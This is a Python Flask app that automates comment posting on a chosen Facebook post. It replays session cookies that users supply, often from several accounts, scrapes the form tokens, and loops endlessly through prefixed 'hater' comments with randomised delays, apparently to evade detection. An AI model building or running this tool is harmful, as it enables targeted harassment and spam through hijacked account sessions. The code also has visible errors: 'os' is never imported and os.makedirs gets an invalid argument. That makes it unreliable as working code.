from flask import Flask, render_template, request, jsonify
import requests
import re
import time
import threading
import random
import string
import json
from datetime import datetime
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)

# Global variables to manage tasks
active_tasks = {}
task_lock = threading.Lock()

class FacebookCommenter:
    def __init__(self, task_id):
        self.task_id = task_id
        self.comment_count = 0
        self.start_time = datetime.now()
        self.is_running = True
        self.last_status = "Initializing"
        
    def stop_task(self):
        self.is_running = False
        
    def get_status(self):
        return {
            "status": "running" if self.is_running else "stopped",
            "comment_count": self.comment_count,
            "uptime": str(datetime.now() - self.start_time),
            "last_status": self.last_status,
            "task_id": self.task_id
        }
    
    def extract_post_id(self, url):
        """Improved post ID extraction for all URL types"""
        try:
            # Handle mobile URLs
            if "m.facebook.com" in url or "mbasic.facebook.com" in url:
                if "/posts/" in url:
                    return url.split("/posts/")[1].split("?")[0].split("/")[0]
                elif "/story.php" in url:
                    return parse_qs(urlparse(url).query).get('story_fbid', [''])[0]
            
            # Handle desktop URLs
            elif "facebook.com" in url:
                if "/posts/" in url:
                    return url.split("/posts/")[1].split("?")[0].split("/")[0]
                elif "/permalink.php" in url:
                    return parse_qs(urlparse(url).query).get('story_fbid', [''])[0]
                elif "/groups/" in url and "/permalink/" in url:
                    parts = url.split("/")
                    return parts[parts.index("permalink") + 1]
            
            # Fallback - try to extract numeric ID
            match = re.search(r'/(\d+)/?$', url)
            if match:
                return match.group(1)
                
            return None
        except Exception as e:
            self.last_status = f"URL Error: {str(e)}"
            return None

    def parse_cookies(self, cookie_input):
        """Handle all cookie formats including files"""
        try:
            # If input is a file path
            if os.path.exists(cookie_input):
                with open(cookie_input, 'r') as f:
                    cookie_input = f.read()
            
            # Try to parse as JSON
            try:
                cookie_data = json.loads(cookie_input)
                if isinstance(cookie_data, dict):
                    return "; ".join(f"{k}={v}" for k, v in cookie_data.items())
                elif isinstance(cookie_data, list):
                    return [self.parse_cookies(c) for c in cookie_data]
            except json.JSONDecodeError:
                pass
            
            # Clean and format raw cookies
            cookies = []
            for line in cookie_input.splitlines():
                line = line.strip()
                if line.startswith('[') or line.startswith('{'):
                    try:
                        data = json.loads(line)
                        if isinstance(data, dict):
                            cookies.append("; ".join(f"{k}={v}" for k, v in data.items()))
                        continue
                    except:
                        pass
                
                # Remove square brackets and clean
                line = line.replace('[', '').replace(']', '')
                if any(c in line for c in ['=', ':']):
                    cookies.append(line.strip('; '))
            
            return cookies if len(cookies) > 1 else cookies[0] if cookies else ""
            
        except Exception as e:
            self.last_status = f"Cookie Error: {str(e)}"
            return cookie_input

    def verify_cookies(self, cookies):
        """Check if cookies are valid using m.facebook.com"""
        try:
            session = requests.Session()
            session.cookies.update({"cookie": cookies})
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'
            })
            
            # Check both endpoints
            for endpoint in [
                'https://m.facebook.com/me',
                'https://www.facebook.com/me'
            ]:
                try:
                    response = session.get(endpoint, timeout=10, allow_redirects=False)
                    if response.status_code == 200 and 'c_user' in session.cookies.get_dict():
                        return True
                except:
                    continue
            return False
        except Exception as e:
            self.last_status = f"Cookie Verify Error: {str(e)}"
            return False

    def send_comment(self, cookies, post_url, comment_text, hater_name, last_name):
        try:
            post_id = self.extract_post_id(post_url)
            if not post_id:
                self.last_status = "Invalid post URL"
                return False

            parsed_cookies = self.parse_cookies(cookies)
            if not self.verify_cookies(parsed_cookies):
                self.last_status = "Invalid cookies - login failed"
                return False

            session = requests.Session()
            session.cookies.update({"cookie": parsed_cookies})
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://m.facebook.com',
                'Referer': post_url
            })

            # Try m.facebook.com first
            response = session.get(f'https://m.facebook.com/{post_id}', allow_redirects=True)
            
            # Extract required parameters
            fb_dtsg = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
            jazoest = re.search('name="jazoest" value="([^"]+)"', response.text)
            
            if not fb_dtsg or not jazoest:
                self.last_status = "Could not find comment form"
                return False

            # Prepare comment
            formatted_comment = f"{hater_name} {comment_text.strip()} {last_name}"
            
            # Submit comment
            response = session.post(
                'https://m.facebook.com/a/comment.php',
                data={
                    'fb_dtsg': fb_dtsg.group(1),
                    'jazoest': jazoest.group(1),
                    'comment_text': formatted_comment
                },
                headers={'Content-Type': 'application/x-www-form-urlencoded'}
            )

            if response.status_code == 200:
                self.comment_count += 1
                self.last_status = f"Comment posted: {formatted_comment}"
                return True
            else:
                self.last_status = f"Failed with status {response.status_code}"
                return False

        except Exception as e:
            self.last_status = f"Comment Error: {str(e)}"
            return False

    def run_task(self, config):
        try:
            cookies = config['cookies']
            post_url = config['post_url']
            comments = config['comments']
            delay = config['delay']
            hater_name = config['hater_name']
            last_name = config['last_name']
            
            # Handle multiple cookies
            if isinstance(cookies, str):
                cookies = [cookies]
            
            cookie_index = 0
            comment_index = 0
            
            while self.is_running:
                current_cookie = cookies[cookie_index % len(cookies)]
                current_comment = comments[comment_index % len(comments)]
                
                success = self.send_comment(
                    current_cookie,
                    post_url,
                    current_comment,
                    hater_name,
                    last_name
                )
                
                if success:
                    comment_index += 1
                
                cookie_index += 1
                time.sleep(delay + random.uniform(1, 3))  # Random delay
                
        except Exception as e:
            self.last_status = f"Task Error: {str(e)}"
        finally:
            with task_lock:
                if self.task_id in active_tasks:
                    del active_tasks[self.task_id]

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start_task', methods=['POST'])
def start_task():
    try:
        # Handle both form data and file uploads
        cookies = []
        if 'cookies_file' in request.files and request.files['cookies_file'].filename != '':
            cookies = request.files['cookies_file'].read().decode('utf-8')
        else:
            cookies = request.form.get('cookies_text', '')
        
        comments = []
        if 'comments_file' in request.files and request.files['comments_file'].filename != '':
            comments = request.files['comments_file'].read().decode('utf-8')
        else:
            comments = request.form.get('comments_text', '')
        
        # Create config
        config = {
            'cookies': cookies,
            'post_url': request.form.get('post_url', '').strip(),
            'hater_name': request.form.get('hater_name', '').strip(),
            'last_name': request.form.get('last_name', '').strip(),
            'comments': [c.strip() for c in comments.splitlines() if c.strip()],
            'delay': max(5, int(request.form.get('delay', 10)))  # Minimum 5 second delay
        }
        
        # Validate
        if not all([config['cookies'], config['post_url'], config['hater_name'], 
                  config['last_name'], config['comments']]):
            return jsonify({'status': 'error', 'message': 'All fields are required'})
        
        # Create task
        task_id = ''.join(random.choices(string.digits, k=8))
        commenter = FacebookCommenter(task_id)
        
        # Verify cookies
        parsed_cookies = commenter.parse_cookies(config['cookies'])
        if not commenter.verify_cookies(parsed_cookies):
            return jsonify({'status': 'error', 'message': 'Invalid cookies - login failed'})
        
        # Start task
        thread = threading.Thread(target=commenter.run_task, args=(config,))
        thread.daemon = True
        thread.start()
        
        with task_lock:
            active_tasks[task_id] = commenter
        
        return jsonify({
            'status': 'success',
            'task_id': task_id,
            'message': 'Task started successfully'
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/stop_task', methods=['POST'])
def stop_task():
    task_id = request.json.get('task_id')
    if not task_id:
        return jsonify({'status': 'error', 'message': 'Task ID required'})
    
    with task_lock:
        if task_id in active_tasks:
            active_tasks[task_id].stop_task()
            return jsonify({'status': 'success', 'message': 'Task stopped'})
        return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/task_status', methods=['GET', 'POST'])
def task_status():
    task_id = request.args.get('task_id') or request.json.get('task_id')
    if not task_id:
        return jsonify({'status': 'error', 'message': 'Task ID required'})
    
    with task_lock:
        if task_id in active_tasks:
            return jsonify({'status': 'success', 'data': active_tasks[task_id].get_status()})
        return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/active_tasks')
def get_active_tasks():
    with task_lock:
        return jsonify({
            'status': 'success',
            'data': {task_id: task.get_status() for task_id, task in active_tasks.items()}
        })

if __name__ == '__main__':
    os.makedirs('uploads', exist_debug=True)
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
